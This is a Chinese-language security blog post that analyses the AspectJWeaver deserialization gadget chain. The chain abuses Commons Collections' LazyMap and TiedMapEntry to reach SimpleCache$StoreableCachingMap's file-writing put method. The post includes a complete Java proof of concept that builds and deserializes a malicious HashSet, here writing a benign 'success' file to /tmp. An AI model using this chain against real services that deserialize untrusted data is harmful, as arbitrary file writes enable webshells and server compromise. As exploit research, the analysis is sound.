# AspectJWeaver 任意文件写入链分析

  
  
&lt;!--more--&gt;  
## 0X00 前言  
AspectJ 是 Eclipse 基金组织的开源项目，它是 Java 语言的一个 AOP 实现，是最早、功能比较强大的 AOP 实现之一，对整套 AOP 机制都有较好的实现，很多其他语言的 AOP 实现也借鉴或者采纳了 AspectJ 中的很多设计。在 Java 领域，AspectJ 中的很多语法结构基本上已经成为 AOP 领域的标准。  
## 0x01 漏洞分析  
Chain gadget  
```  
HashSet.readObject()  
    HashMap.put()  
        HashMap.hash()  
            TiedMapEntry.hashCode()  
                TiedMapEntry.getValue()  
                    LazyMap.get()  
                        SimpleCache$StorableCachingMap.put()  
                            SimpleCache$StorableCachingMap.writeToPath()  
```  
`pom.xml`  
```xml  
   &lt;dependencies&gt;  
        &lt;dependency&gt;  
            &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  
            &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt;  
            &lt;version&gt;1.9.2&lt;/version&gt;  
        &lt;/dependency&gt;  
        &lt;dependency&gt;  
            &lt;groupId&gt;commons-collections&lt;/groupId&gt;  
            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  
            &lt;version&gt;3.2.1&lt;/version&gt;  
        &lt;/dependency&gt;  
    &lt;/dependencies&gt;  
```  
### **sink点**  
`SimpleCache$StoreableCachingMap`  
在`org.aspectj.weaver.tools.cache.SimpleCache`类中定义了一个内部类`StoreableCachingMap`，这个类继承了`HashMap`，提供了将Map中值写入文件中的功能。  
在调用`put`方法向`StoreableCachingMap`中放入值时，会调用`wrteToPath`方法将`value`中的值写入到文件中。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504050038188.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504050038849.png)
路径拼接`folder &#43; File.separator &#43; key`，`values`是`bytes`数组类型的数据。  
这就构成了一个文件写入的sink点，  
```java  
import java.lang.reflect.Constructor;    
import java.nio.charset.StandardCharsets;    
import java.util.HashMap;    
    
public class FileWrite {    
    public static void main(String[] args) throws Exception {    
        Class&lt;?&gt; clazz = Class.forName(&#34;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&#34;);    
        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class, int.class);    
        constructor.setAccessible(true);    
        HashMap&lt;String,Object&gt; map = (HashMap) constructor.newInstance(&#34;/tmp&#34;,1000);    
        map.put(&#34;success&#34;,&#34;success&#34;.getBytes(StandardCharsets.UTF_8));    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504050042381.png)
谁能触发`org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap`中的`put`方法呢？  
### LazyMap  
在CC链中`org.apache.commons.collections.map.LazyMap`类，在`transform`之后会调用封装的内部`map`的`put`方法将结果保存，这就会触发到`put`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504050046915.png)
### POC构造  
所以我们可以用`HashSet`反序列化来触发`TiedMapEntry`的`hashCode`进一步触发`LazyMap`的`get`方法，  
```java  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.nio.charset.StandardCharsets;  
import java.util.HashMap;  
import java.util.HashSet;  
import java.util.Map;  
  
public class Poc {  
    public static void main(String[] args) throws Exception {  
        String fileName    = &#34;success&#34;;  
        String filePath    = &#34;/tmp&#34;;  
        String fileContent = &#34;success&#34;;  
  
        // 初始化 HashMap  
        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();  
  
        // 实例化  StoreableCachingMap 类  
        Class&lt;?&gt;       c           = Class.forName(&#34;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&#34;);  
        Constructor&lt;?&gt; constructor = c.getDeclaredConstructor(String.class, int.class);  
        constructor.setAccessible(true);  
        Map map = (Map) constructor.newInstance(filePath, 10000);  
  
        // 初始化一个 Transformer，使其 transform 方法返回要写出的 byte[] 类型的文件内容  
        Transformer transformer = new ConstantTransformer(fileContent.getBytes(StandardCharsets.UTF_8));  
  
        // 使用 StoreableCachingMap 创建 LazyMap 并引入 TiedMapEntry  
        Map          lazyMap = LazyMap.decorate(map, transformer);  
        TiedMapEntry entry   = new TiedMapEntry(lazyMap, fileName);  
  
        HashSet hashset = new HashSet(1);  
        hashset.add(&#34;foo&#34;);  
        //HashSet 基于 HashMap 来实现的，获取其HashSet中的HashMap  
        Field field = Class.forName(&#34;java.util.HashSet&#34;).getDeclaredField(&#34;map&#34;);  
        field.setAccessible(true);  
        HashMap hashset_map = (HashMap) field.get(hashset);  
        //反射获取了 HashMap 中的 table 属性，table其实就是hashmap的存储底层，将HashMap中的每一个元素&lt;Key,Value&gt; 封装在了 Node 对象中，将这些node对象存储在table数组中  
        Field table = Class.forName(&#34;java.util.HashMap&#34;).getDeclaredField(&#34;table&#34;);  
        table.setAccessible(true);  
        Object[] array = (Object[])table.get(hashset_map);  
        //在获取到了 table 中的 key 之后，利用反射修改其为 tiedmap  
        Object node = array[0];  
        if(node == null){  
            node = array[1];  
        }  
        Field key = node.getClass().getDeclaredField(&#34;key&#34;);  
        key.setAccessible(true);  
        key.set(node,entry);  
  
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
        objectOutputStream.writeObject(hashset);  
  
        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));  
        objectInputStream.readObject();  
  
    }  
}  
```  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/aspectjweaver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E9%93%BE%E5%88%86%E6%9E%90/  

